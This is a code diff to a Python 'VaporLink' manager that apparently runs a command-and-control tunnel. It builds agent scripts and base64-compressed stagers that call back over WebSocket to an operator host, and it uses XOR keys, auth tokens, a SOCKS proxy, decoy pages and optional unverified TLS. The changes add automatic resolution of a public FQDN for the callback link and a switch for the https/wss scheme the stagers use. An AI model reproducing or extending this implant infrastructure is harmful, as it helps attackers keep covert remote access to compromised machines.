@@ -2,6 +2,7 @@ import asyncio
 import base64
 import hashlib
 import hmac
+import ipaddress
 import itertools
 import json
 import mimetypes
@@ -290,6 +291,87 @@ class VaporLinkManager:
         except Exception:
             return "127.0.0.1"
 
+    def _get_cert_fqdn(self) -> str:
+        """Extracts a valid FQDN (Common Name or DNS SAN) from cert.pem if present."""
+        cert_path = os.path.join(self.base_dir, "cert.pem")
+        if not os.path.isfile(cert_path):
+            return ""
+        try:
+            from cryptography import x509
+            from cryptography.x509.oid import NameOID, ExtensionOID
+
+            with open(cert_path, "rb") as f:
+                cert = x509.load_pem_x509_certificate(f.read())
+
+            candidates = []
+            cn_attrs = cert.subject.get_attributes_for_oid(NameOID.COMMON_NAME)
+            if cn_attrs:
+                candidates.append(str(cn_attrs[0].value).strip())
+
+            try:
+                san_ext = cert.extensions.get_extension_for_oid(ExtensionOID.SUBJECT_ALTERNATIVE_NAME)
+                for dns_name in san_ext.value.get_values_for_type(x509.DNSName):
+                    candidates.append(str(dns_name).strip())
+            except Exception:
+                pass
+
+            for cand in candidates:
+                clean = cand.lstrip("*.")
+                if clean and clean.lower() not in ("localhost", "unknown") and "." in clean:
+                    try:
+                        ipaddress.ip_address(clean)
+                    except ValueError:
+                        return clean
+        except Exception:
+            pass
+        return ""
+
+    def _resolve_preferred_host(self, cursor=None) -> str:
+        """Determines the preferred public FQDN or IP from agent_configurations, cert.pem, or local IP."""
+        # 1. Check agent_configurations server_url first
+        try:
+            close_conn = False
+            if cursor is None:
+                conn = sqlite3.connect(CONFIG.database)
+                cursor = conn.cursor()
+                close_conn = True
+            cursor.execute("SELECT server_url FROM agent_configurations ORDER BY id DESC LIMIT 1")
+            row = cursor.fetchone()
+            if close_conn:
+                conn.close()
+            if row and row[0]:
+                raw_url = row[0] if "://" in row[0] else f"https://{row[0]}"
+                parsed = urllib.parse.urlparse(raw_url)
+                if parsed.hostname and parsed.hostname not in ("127.0.0.1", "localhost", "0.0.0.0"):
+                    try:
+                        ipaddress.ip_address(parsed.hostname)
+                    except ValueError:
+                        return parsed.hostname
+        except Exception:
+            pass
+
+        # 2. Check active SSL certificate FQDN (e.g. Let's Encrypt cert.pem)
+        cert_fqdn = self._get_cert_fqdn()
+        if cert_fqdn:
+            return cert_fqdn
+
+        # 3. Fallback to agent_configurations IP if set, otherwise local IP
+        try:
+            conn = sqlite3.connect(CONFIG.database)
+            c = conn.cursor()
+            c.execute("SELECT server_url FROM agent_configurations ORDER BY id DESC LIMIT 1")
+            row = c.fetchone()
+            conn.close()
+            if row and row[0]:
+                raw_url = row[0] if "://" in row[0] else f"https://{row[0]}"
+                parsed = urllib.parse.urlparse(raw_url)
+                if parsed.hostname:
+                    return parsed.hostname
+        except Exception:
+            pass
+
+        return self._get_local_ip()
+
     def _init_db(self):
         conn = sqlite3.connect(CONFIG.database)
         c = conn.cursor()
@@ -312,17 +394,7 @@ class VaporLinkManager:
         default_xor = "".join(secrets.choice(alnum) for _ in range(16))
         default_token = "".join(secrets.choice(alnum) for _ in range(32))
 
-        # Check if an agent_configurations server_url exists to infer hostname
-        default_host = self._get_local_ip()
-        try:
-            c.execute("SELECT server_url FROM agent_configurations ORDER BY id DESC LIMIT 1")
-            row = c.fetchone()
-            if row and row[0]:
-                parsed = urllib.parse.urlparse(row[0])
-                if parsed.hostname:
-                    default_host = parsed.hostname
-        except Exception:
-            pass
+        default_host = self._resolve_preferred_host(cursor=c)
 
         cert_path = os.path.join(self.base_dir, "cert.pem")
         key_path = os.path.join(self.base_dir, "key.pem")
@@ -332,6 +404,8 @@ class VaporLinkManager:
             "xor_key": default_xor,
             "conn_token": default_token,
             "ws_link": f"{default_host}:9443/api",
+            "ws_link_custom": "off",
+            "public_tls": "on" if has_certs else "off",
             "ws_ip": "0.0.0.0",
             "ws_port": "9443",
             "socks_ip": "127.0.0.1",
@@ -352,7 +426,6 @@ class VaporLinkManager:
         c = conn.cursor()
         c.execute("SELECT key, value FROM vaporlink_settings")
         rows = dict(c.fetchall())
-        conn.close()
 
         cert_path = rows.get("ssl_cert", "") or os.path.join(self.base_dir, "cert.pem")
         key_path = rows.get("ssl_key", "") or os.path.join(self.base_dir, "key.pem")
@@ -360,19 +433,63 @@ class VaporLinkManager:
         tls_active = bool(tls_flag and os.path.isfile(cert_path) and os.path.isfile(key_path))
 
         try:
-            ws_port = int(rows.get("ws_port", "8443"))
+            ws_port = int(rows.get("ws_port", "9443"))
         except ValueError:
-            ws_port = 8443
+            ws_port = 9443
 
         try:
             socks_port = int(rows.get("socks_port", "1080"))
         except ValueError:
             socks_port = 1080
 
+        ws_link_custom = rows.get("ws_link_custom", "off").lower() in ("on", "true", "1", "yes")
+        preferred_host = self._resolve_preferred_host(cursor=c)
+        raw_ws_link = rows.get("ws_link", f"{preferred_host}:{ws_port}/api")
+
+        # Auto-upgrade ws_link host to FQDN only if operator has NOT set a manual override
+        if not ws_link_custom:
+            try:
+                ipaddress.ip_address(preferred_host)
+                preferred_is_fqdn = False
+            except ValueError:
+                preferred_is_fqdn = preferred_host not in ("localhost", "")
+
+            if preferred_is_fqdn and raw_ws_link:
+                clean_link = raw_ws_link
+                for prefix in ("https://", "http://", "wss://", "ws://"):
+                    if clean_link.startswith(prefix):
+                        clean_link = clean_link[len(prefix):]
+                host_port, _, path_part = clean_link.partition("/")
+                cur_host, _, cur_port = host_port.partition(":")
+                cur_host_is_ip_or_local = cur_host in ("localhost", "127.0.0.1", "0.0.0.0")
+                if not cur_host_is_ip_or_local:
+                    try:
+                        ipaddress.ip_address(cur_host)
+                        cur_host_is_ip_or_local = True
+                    except ValueError:
+                        pass
+                if cur_host_is_ip_or_local:
+                    port_str = f":{cur_port}" if cur_port else f":{ws_port}"
+                    path_str = f"/{path_part}" if path_part else "/api"
+                    raw_ws_link = f"{preferred_host}{port_str}{path_str}"
+                    c.execute("INSERT OR REPLACE INTO vaporlink_settings (key, value) VALUES ('ws_link', ?)", (raw_ws_link,))
+                    conn.commit()
+
+        conn.close()
+
+        # Public TLS determines whether clients/stagers connect via https:// & wss://
+        # (e.g. True when Direct TLS is enabled OR when running behind an HTTPS Reverse Proxy on 443)
+        if "public_tls" in rows:
+            public_tls = rows.get("public_tls", "on").lower() in ("on", "true", "1", "yes")
+        else:
+            public_tls = tls_active
+
         return {
             "xor_key": rows.get("xor_key", "DefaultKey123456"),
             "conn_token": rows.get("conn_token", "DefaultToken12345678901234567890"),
-            "ws_link": rows.get("ws_link", f"{self._get_local_ip()}:{ws_port}/api"),
+            "ws_link": raw_ws_link,
+            "ws_link_custom": ws_link_custom,
+            "public_tls": public_tls,
             "ws_ip": rows.get("ws_ip", "0.0.0.0"),
             "ws_port": ws_port,
             "socks_ip": rows.get("socks_ip", "127.0.0.1"),
@@ -383,6 +500,32 @@ class VaporLinkManager:
             "ssl_key": key_path,
             "web_root": self.web_root,
         }
+
+    def sync_fqdn_from_url(self, server_url: str, force: bool = False):
+        """Syncs VaporLink's callback ws_link hostname when agent server_url is updated (unless manually overridden)."""
+        if not server_url:
+            return
+        if self.config.get("ws_link_custom") and not force:
+            return
+        raw_url = server_url if "://" in server_url else f"https://{server_url}"
+        parsed = urllib.parse.urlparse(raw_url)
+        if not parsed.hostname or parsed.hostname in ("127.0.0.1", "localhost", "0.0.0.0"):
+            return
+        cur_link = self.config.get("ws_link", f"{parsed.hostname}:{self.config.get('ws_port', 9443)}/api")
+        for prefix in ("https://", "http://", "wss://", "ws://"):
+            if cur_link.startswith(prefix):
+                cur_link = cur_link[len(prefix):]
+        host_port, _, path_part = cur_link.partition("/")
+        _, _, cur_port = host_port.partition(":")
+        port_str = f":{cur_port}" if cur_port else f":{self.config.get('ws_port', 9443)}"
+        path_str = f"/{path_part}" if path_part else "/api"
+        new_link = f"{parsed.hostname}{port_str}{path_str}"
+        updates = {"ws_link": new_link}
+        if force:
+            updates["ws_link_custom"] = "off"
+        if new_link != self.config.get("ws_link") or force:
+            self.save_config(updates)
+            self.log("INFO", f"Synchronized VaporLink callback FQDN to {new_link}")
 
     def save_config(self, updates: dict) -> dict:
         conn = sqlite3.connect(CONFIG.database)
@@ -480,7 +623,8 @@ class VaporLinkManager:
         xor_key_str = cfg["xor_key"]
         auth_token = cfg["conn_token"]
         ws_link = (custom_link or cfg["ws_link"]).strip()
-        scheme_default = "wss://" if cfg["tls_enabled"] else "ws://"
+        use_public_tls = cfg.get("public_tls", cfg["tls_enabled"])
+        scheme_default = "wss://" if use_public_tls else "ws://"
 
         code = f'''import asyncio,base64,hashlib,os,platform,socket,ssl,struct,subprocess,sys,urllib.parse
 _ed=os.path.dirname(os.path.abspath(sys.executable))
@@ -623,12 +767,13 @@ if __name__=="__main__" or "_VL_DIRECT" in globals():
         agent_bytes = self.build_agent_script(insecure=insecure, custom_link=ws_link)
         compressed_b64 = base64.b64encode(zlib.compress(agent_bytes, 9)).decode("ascii")
 
-        http_scheme = "https" if cfg["tls_enabled"] else "http"
-        ws_scheme = "wss" if cfg["tls_enabled"] else "ws"
+        use_public_tls = cfg.get("public_tls", cfg["tls_enabled"])
+        http_scheme = "https" if use_public_tls else "http"
+        ws_scheme = "wss" if use_public_tls else "ws"
 
-        ssl_snippet = ";ctx=ssl._create_unverified_context()" if (insecure and cfg["tls_enabled"]) else ";ctx=None"
-        ssl_arg = ",context=ctx" if (insecure and cfg["tls_enabled"]) else ""
-        ssl_imp = ",ssl" if (insecure and cfg["tls_enabled"]) else ""
+        ssl_snippet = ";ctx=ssl._create_unverified_context()" if (insecure and use_public_tls) else ";ctx=None"
+        ssl_arg = ",context=ctx" if (insecure and use_public_tls) else ""
+        ssl_imp = ",ssl" if (insecure and use_public_tls) else ""
         token = cfg["conn_token"]
         hdr_dict = f'{{"X-Vapor-Token":"{token}","X-Vapor-Mode":"stage","X-Vapor-SSL":"{"0" if insecure else "1"}","Upgrade":"websocket","Connection":"Upgrade"}}'
 
@@ -1335,10 +1480,12 @@ else:
         ]
         active_streams = sum(s["active_streams"] for s in sessions_list)
         primary_sess = next((s for s in sessions_list if s["is_primary"]), None)
-        scheme = "https" if cfg["tls_enabled"] else "http"
+        use_public_tls = cfg.get("public_tls", cfg["tls_enabled"])
+        scheme = "https" if use_public_tls else "http"
         host_part = cfg["ws_link"].split("/", 1)[0] if cfg["ws_link"] else f"{self._get_local_ip()}:{cfg['ws_port']}"
         decoy_url = f"{scheme}://{host_part}/"
         decoy_api_url = f"{scheme}://{cfg['ws_link']}"
+        auto_host = self._resolve_preferred_host()
 
         return {
             "running": self.running,
@@ -1351,6 +1498,7 @@ else:
             "total_bytes_tx": self.total_bytes_tx,
             "total_bytes_rx": self.total_bytes_rx,
             "config": cfg,
+            "auto_host": auto_host,
             "decoy_url": decoy_url,
             "decoy_api_url": decoy_api_url,
             "banned_ips": self.get_banned_ips(),
